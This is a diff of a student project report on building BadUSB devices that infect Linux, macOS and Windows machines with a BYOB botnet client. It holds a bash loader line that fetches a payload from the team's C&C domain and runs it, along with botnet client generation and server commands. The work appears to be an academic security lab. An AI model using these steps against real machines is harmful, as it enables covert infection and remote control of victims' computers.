@@ -14,21 +14,18 @@ logo: "./images/csus.png"
 logo-width: 150
 ...
 
-
-# CSUS CSC154: Project
-
-## Objective  
+# Objective  
 The objective of this project was to create BadUSB devices, that upon plugin, infect victim computers with malware configured to join a botnet.
 
 
-## Botnet C&C
+# Botnet C&C
 For our botnet we're using [Build Your Own Botnet](https://github.com/malwaredllc/byob). Our ultimate goal was an easily deployed and managed *command and control server*, with the ability to generate cross platform compatible clients.
 
 
 ### Command and Control Server  
-* [Digital Ocean](https://digitalocean.com)
-* [Domain Name](https://sheep.casa)
-* [BYOB](https://github.com/malwaredllc/byob)
+* *[Digital Ocean](https://digitalocean.com)*
+* *[Domain Name](https://sheep.casa)*
+* *[Build Your Own Botnet (BYOB)](https://github.com/malwaredllc/byob)*
 
 
 We've created a VPS on Digital Ocean to run our C&C server. We're using an Ubuntu 18.04 droplet at the cost of $5 per month. Additionally, we've purchased the domain `sheep.casa`, and directed it towards our C&C server.
@@ -54,10 +51,10 @@ cd /opt/byob/byob && python server.py --port 1337
 
 
 
-## BadUSB  
+# BadUSB  
 To create our BadUSB devices we've used the [DigiSpark](http://digistump.com/products/1) development board by [Digistump](http://digistump.com/). These devices are recognized as USB keyboards by the victims' machines, and will execute keystrokes to deliver our payload.
 
-### DigiSpark Setup
+## DigiSpark Setup
 We've purchased our BadUSB (DigiSpark) devices via Amazon. We have 12 of these devices spread across our members. They cost about $3 dollars each.
 
 ![amazon](./images/amazon.png)
@@ -111,7 +108,8 @@ As you can see above, the code delays for two seconds to allow the machine to re
 The code for our `linux_loader` and `linux_payload.py` can be found in the section below.
 
 
-#### Linux/OSX Loader  
+### Linux/OSX Loader  
+
 Our BadUSB attack downloads and executes the loader script. For our attack on Linux and OSX machines this is a bash script called `linux_loader`, which can be found below.
 
 ```bash
@@ -121,7 +119,7 @@ nohup wget https://sheep.casa/payloads/linux_payload.py -P /tmp && python /tmp/l
 
 The loader script downloads our python payload and executes it to join our botnet. This script is run in the background so that the terminal window is not present while the botnet client (payload) is running.
 
-#### Python Payload for Botnet
+### Python Payload for Botnet
 
 A payload is generated via BYOB's `client.py` script. We've generated our Linux payload by issuing `python client.py --name linux_payload --encrypt --compress --freeze sheep.casa 1337`.
 
@@ -232,32 +230,32 @@ void loop() {}
 The above code opens powershell to download and execute our `windows_payload.exe`.
 
 
-#### Windows Payload for Botnet
+### Windows Payload for Botnet  
 To generate a Windows client for our botnet, we must run the code from a Windows machine to create an executable. Unfortunately, BYOB has a significant amount of bugs at the moment, and cross platform compatibility is not as it claims to be. **To successfully connect to our botnet from Windows, we needed to host the C&C server on a Windows machine.**
 
 
-## Examples
+# Examples
 
-### Demo Video
+## Demo Video
 [https://sheep.casa/csc154_project.m4v](https://sheep.casa/csc154_project.m4v)
 
-### Linux/OSX
+## Linux/OSX
 Below is an example of a client connecting to the C&C server. This is actually Ryan's laptop connecting, after plugging the BadUSB device into it.
 
 ![infected](./images/infected.png)
 **Figure 11:** Session on x at wartop (Ryan's Laptop).  
 
-### Windows   
+## Windows   
 Below is an example of a Windows client connecting to a Windows C&C host,  
 ![session_demo](./images/session_demo.png)  
 **Figure 12:** Windows client connection.
 
 
 
-## Conclusion
+# Conclusion
 We've configured our BadUSB devices to infect Linux, Windows and OSX machines. Upon plugin, our device will execute a payload to join our Botnet. Below is an elaboration on the successes and failures of the project.
 
-### Limitations
+## Limitations
 
 ### BadUSB    
 
@@ -274,11 +272,10 @@ If we were to continue working on this project we would need to find a better bo
 
 We would still like to explore the ability to infect all operating systems using the same BadUSB device, but as we said, it couldn't be achieved at this time.
 
-### Final Words
 Ultimately our BadUSB devices were extremely successful on all platforms, despite our inability to use the same device for each. Our botnet endeavor was less successful in the end, but we learned a great deal, and if we had time to continue the project we're aware of what direction we would go in to achieve what we were trying to this semester. Time was our greatest limiting factor for this project.
 
 
-## References  
+# References  
 1. [Build Your Own Botnet](https://github.com/malwaredllc/byob)
 2. [DigiSpark Payloads](https://github.com/kbeflo/digispark-payloads).
 3. [DigiSpark Apple Keyboard Mod Explanation](https://digistump.com/board/index.php?topic=2612.0)
